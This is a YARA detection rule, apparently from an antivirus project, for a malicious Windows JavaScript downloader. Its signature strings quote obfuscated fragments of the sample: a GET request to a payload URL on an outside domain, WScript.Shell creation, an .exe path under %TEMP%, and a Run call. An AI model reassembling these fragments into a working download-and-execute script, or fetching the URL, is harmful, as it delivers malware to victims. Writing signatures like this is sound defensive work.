rule sig_20160330_1702d83d565d40b0d7adbe9bd6618a13 {
  meta:
    description = "datamaliciousorder - file 20160330_1702d83d565d40b0d7adbe9bd6618a13.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ab0559ecc039d702e00e42343a5fe43696ba6a41f2103e776bf6ad15825eccca"

  strings:
    $s1  = "MT[VD](\"GET\", \"http://aaacollectionsjewelry.com/x9djsa\", false);" fullword ascii
    $s2  = "function B(Z0, YK){UL = UL * 1; return Z0 - YK;};" fullword ascii
    $s3  = "var HK = function GF() {return WScript[FV](\"WScript\"+\".Shell\");}(), D1 = 11;" fullword ascii
    $s4  = "if (MT[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function U(){return C + \"\";};" fullword ascii
    $s6  = "function MF() {return HK[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"UFnkziktxEt.ex\" + \"e\";};" fullword ascii
    $s7  = "function LO() {return ((MH == true) && (MH == Z)) ? 1 : UL;};" fullword ascii
    $s8  = "function KF(F){HK[\"Run\"](F, UL, UL);};" fullword ascii
    $s9  = "function K(){return FV;};" fullword ascii
    $s10 = "var XK = new this[\"Date\"]();" fullword ascii
    $s11 = "}while (YE);" fullword ascii
    $s12 = "function LX(){return 22;};" fullword ascii
    $s13 = "return B(O, MV);" fullword ascii
    $s14 = "function D(GO) {var W = (1, 2, 3, 4, 5, GO); return W;};" fullword ascii
    $s15 = "function MY()" fullword ascii
    $s16 = "Z = true; " fullword ascii
    $s17 = "var Z = false;" fullword ascii
    $s18 = "var C0 = false;" fullword ascii
    $s19 = "var MH = false;" fullword ascii
    $s20 = "MH = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}